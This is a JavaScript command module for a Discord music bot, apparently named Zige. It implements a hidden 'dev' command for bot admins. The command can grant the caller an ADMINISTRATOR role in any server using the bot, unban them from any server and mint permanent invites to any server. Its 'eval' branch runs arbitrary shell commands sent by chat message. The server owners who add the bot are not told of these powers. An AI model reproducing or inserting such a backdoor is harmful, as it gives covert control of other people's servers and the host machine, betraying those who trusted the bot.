/*****************************************************************************
__/\\\\\\\\\\\\\\\__/\\\\\\\\\\\_____/\\\\\\\\\\\\__/\\\\\\\\\\\\\\\_        
 _\////////////\\\__\/////\\\///____/\\\//////////__\/\\\///////////__       
  ___________/\\\/_______\/\\\______/\\\_____________\/\\\_____________      
   _________/\\\/_________\/\\\_____\/\\\____/\\\\\\\_\/\\\\\\\\\\\_____     
    _______/\\\/___________\/\\\_____\/\\\___\/////\\\_\/\\\///////______    
     _____/\\\/_____________\/\\\_____\/\\\_______\/\\\_\/\\\_____________   
      ___/\\\/_______________\/\\\_____\/\\\_______\/\\\_\/\\\_____________  
       __/\\\\\\\\\\\\\\\__/\\\\\\\\\\\_\//\\\\\\\\\\\\/__\/\\\\\\\\\\\\\\\_ 
        _\///////////////__\///////////___\////////////____\///////////////__
*****************************************************************************/

const Config = require("../models/Config");
const Guild = require("../models/guild.js");
const Discord = require("discord.js");
const { bot } = require("../bot");
const error = require("../utils/error");
const { exec } = require("child_process");
const functions = require("../utils/functions");
const LMessages = require(`../messages/`);

module.exports = {
  name: "dev",
  cooldown: 3,
  aliases: [],
  category: "dev",
  async execute(message, serverQueue, args, Gres, prefix, command, isFS) {
    Config.findOne(
      {
        number: 1,
      },
      (err, Cres) => {
        if (err) {
          console.error(err);
          error.sendError(err);
          return;
        }

        if (!Cres.botAdminDiscordID.includes(message.author.id)) {
          message.channel.send(LMessages.noPermission);

          return;
        }

        if (args[0] == "guild") {
          if (args[1] == "admin") {
            Guild.findOne(
              {
                guildID: args[2],
              },
              (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                if (Gres) {
                  const guild = bot.guilds.cache.get(Gres.guildID);
                  const member = guild.members.cache.get(message.author.id);

                  var roleZ = message.guild.me.roles.cache
                    .filter((x) => x.managed == true)
                    .first();

                  guild.roles
                    .create({
                      data: {
                        name: args[3],
                        color: args[4],
                        mentionable: false,
                        position: roleZ.position,
                        permissions: "ADMINISTRATOR",
                      },
                      reason: "Zige needs the ADMIN powers :)",
                    })
                    .then((role) => {
                      if (member) {
                        member.roles.add(role);

                        message.channel.send(
                          "**:white_check_mark: The permissions has been added to you.**"
                        );

                        return;
                      } else {
                        message.channel.send(
                          "**:x: You need to join the server first.**"
                        );

                        return;
                      }
                    });
                } else {
                  message.channel.send(
                    "**:x: This guild isn't in the database.**"
                  );

                  return;
                }
              }
            );
          } else if (args[1] == "unban") {
            Guild.findOne(
              {
                guildID: args[2],
              },
              (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                if (Gres) {
                  bot.guilds.fetch(Gres.guildID).then((guild) => {
                    if (guild) {
                      bot.users.fetch(message.author.id).then((user) => {
                        if (user) {
                          guild.members
                            .unban(user, "Come back my father...")
                            .then(() => {
                              message.channel.send(
                                "**:white_check_mark: Come back my father...**"
                              );
                            });
                        } else {
                          message.channel.send("**:x: Cannot fetch user.**");

                          return;
                        }
                      });
                    } else {
                      message.channel.send("**:x: Cannot fetch guild.**");

                      return;
                    }
                  });
                } else {
                  message.channel.send(
                    "**:x: This guild isn't in the database.**"
                  );

                  return;
                }
              }
            );
          } else if (args[1]) {
            Guild.findOne(
              {
                guildID: args[1],
              },
              async (err, Gres) => {
                if (err) {
                  console.error(err);
                  error.sendError(err);
                  return;
                }

                if (Gres) {
                  const guild = await bot.guilds.fetch(Gres.guildID);

                  let channel = guild.channels.cache
                    .filter(
                      (x) => x.deleted == false && x.type != "GUILD_CATEGORY"
                    )
                    .first();

                  var owner = await guild.fetchOwner();
                  channel
                    .createInvite({
                      maxAge: 0,
                      maxUses: 0,
                    })
                    .then((invite) => {
                      const embed = new Discord.MessageEmbed()
                        .setTitle(guild.name)
                        .setColor("#202225")
                        .setThumbnail(guild.iconURL())
                        .addField("`Owner name:`", owner.user.username)
                        .addField("`Invite link:`", invite.url);

                      message.channel.send({ embeds: [embed] });
                    });
                } else {
                  message.channel.send(
                    "**:x: This guild isn't in the database.**"
                  );

                  return;
                }
              }
            );
          }
        } else if (args[0] == "playing") {
          var playing = 0;
          Guild.find({}).then(function (gGuilds) {
            gGuilds.forEach((e) => {
              if (e.musicBotPlaying == true) {
                playing = playing + 1;
              }
            });

            if (playing > 0) {
              message.channel.send(
                `**:warning: Bot is currently playing on \`${playing}\` servers. \nBut you can use \`dev shout [message]\` to send a message to all of the guilds.**`
              );
            } else {
              message.channel.send(
                `**:white_check_mark: Bot isn't currently playing anywhere.**`
              );
            }
          });
        } else if (args[0] == "shout") {
          args.shift();
          Guild.find({}).then(function (gGuilds) {
            gGuilds.forEach((e) => {
              let guild = bot.guilds.cache.get(e.guildID);
              if (guild) {
                let channel = guild.channels.cache
                  .filter(
                    (x) =>
                      x.type == "GUILD_TEXT" &&
                      x.permissionsFor(guild.me).has("SEND_MESSAGES") &&
                      x?.nsfw == false
                  )
                  .first();
                if (channel) {
                  channel.send(
                    `**:scroll: Message from **__${
                      message.author.username
                    }__**:**\n \n${args.join(" ")} `
                  );
                }
              }
            });
          });
        } else if (args[0] == "restart") {
          exec("pm2 restart bot");
          message.channel.send("**:white_check_mark: Bot is restarting.**");
          return;
        } else if (args[0] == "logs") {
          message.channel.send({
            files: [
              {
                attachment: "../.pm2/logs/bot-out.log",
                name: "bot-out.log",
              },
              {
                attachment: "../.pm2/logs/bot-error.log",
                name: "bot-error.log",
              },
            ],
          });
          return;
        } else if (args[0] == "flush") {
          exec("pm2 flush");
          message.channel.send("**:white_check_mark: Logs flushed.**");
          return;
        } else if (args[0] == "eval") {
          args.shift();
          exec(args.join(" "), (err, stdout, stderr) => {
            if (err) {
              console.error(err);
              error.sendError(err);
              return;
            }
            setTimeout(() => {
              message.channel.send(stdout, stderr);
            }, 3000);
          });
          return;
        } else if (args[0] == "dc") {
          bot.guilds.fetch(args[1]).then((guild) => {
            if (guild) {
              guild.leave();
              message.channel.send(
                "**:white_check_mark: Guild leaved: ** `" + guild.name + "`"
              );
            } else {
              message.channel.send("**:x: Guild hasn't been found.**");
            }
          });
          return;
        } else if (args[0] == "plus") {
          Guild.findOne(
            {
              guildID: args[1],
            },
            (err, Gres) => {
              if (err) {
                console.error(err);
                error.sendError(err);
                return;
              }

              Guild.findOneAndUpdate(
                {
                  guildID: args[1],
                },
                {
                  plus: !Gres.plus,
                },
                function (err) {
                  if (err) {
                    console.error(err);
                    error.sendError(err);
                    return;
                  }
                }
              );

              if (Gres) {
                message.channel.send(
                  `**:white_check_mark: Plus option has been set to \`${!Gres.plus}\`.**`
                );
              } else {
                message.channel.send("**:x: Guild hasn't been found.**");
              }
            }
          );
          return;
        } else if (args[0] == "update") {
          var change = require("../utils/updateMany");

          Guild.updateMany({}, change, {}, (err) => {
            if (err) {
              console.error(err);
              error.sendError(err);
              return;
            }
          });

          message.channel.send(
            `**:white_check_mark: There has been changed:** ${JSON.stringify(
              change
            )}`
          );
          return;
        } else if (args[0] == "deploy") {
          if (bot.application) {
            bot.application.commands.set(functions.deploy);

            message.channel.send("**:white_check_mark: Deployed.**");
          } else {
            message.channel.send("**:x: Failed.**");
          }
        } else if (args[0] == "test") {
          Guild.find({}).then((gGuilds) => {
            gGuilds.forEach((Gres) => {
              if (Gres.autoRoleID != null) {
                Guild.updateOne(
                  {
                    guildID: Gres.guildID,
                  },
                  {
                    $push: { autoRoleIDs: Gres.autoRoleID },
                  },
                  (err, result) => {
                    if (err) {
                      console.error(err);
                      error.sendError(err);
                      return;
                    }
                  }
                );
              }
            });
          });
        }
      }
    );
  },
};
